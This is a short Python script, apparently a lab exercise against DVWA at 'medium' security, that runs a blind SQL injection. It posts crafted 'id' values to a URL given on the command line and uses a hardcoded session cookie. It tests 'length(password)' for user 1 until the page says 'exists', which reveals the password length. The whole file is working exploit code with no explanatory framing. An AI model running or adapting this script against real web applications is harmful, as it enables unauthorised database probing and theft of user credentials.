import requests
import sys
import re
from tqdm import tqdm
import time

args = sys.argv
url = args[1]

cookie ={
        "security":"medium",
        "PHPSESSID":"lj2skq5tmnd04ddhq3sjprm73e"
        }

for i in tqdm(range(1,100)):
    sql = "1 and (select length(password) from users where user_id =1) ={counter};#".format(counter =i)

    payload = {
            "id":sql ,
            "Submit" : "Submit"
    }

    response = requests.post(url,data=payload,cookies=cookie)
    if 'exists' in response.text:
        print("password_len:{0}".format(i))
        break
    

print('end')

    
